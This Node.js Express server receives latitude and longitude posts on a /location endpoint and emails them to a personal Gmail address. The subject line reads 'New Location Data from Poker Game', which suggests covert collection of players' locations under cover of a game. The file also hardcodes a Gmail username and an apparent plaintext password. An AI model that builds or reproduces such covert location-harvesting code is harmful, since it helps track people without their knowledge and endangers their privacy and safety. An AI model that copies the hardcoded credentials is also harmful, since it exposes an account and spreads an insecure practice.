const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(bodyParser.json());

// Nodemailer setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'mrdiggajraj@gmail.com', // Your email
        pass: 'Sasuke@123'    // Your email password or app password
    }
});

// Endpoint to receive location
app.post('/location', (req, res) => {
    const { latitude, longitude } = req.body;

    // Email options
    const mailOptions = {
        from: 'amanshriwastava0@gmail.com',
        to: 'mrdiggajraj@gmail.com', // Change to the email where you want to receive data
        subject: 'New Location Data from Poker Game',
        text: `User's Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            res.json({ status: 'success', message: 'Location data emailed.' });
        }
    });
});

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
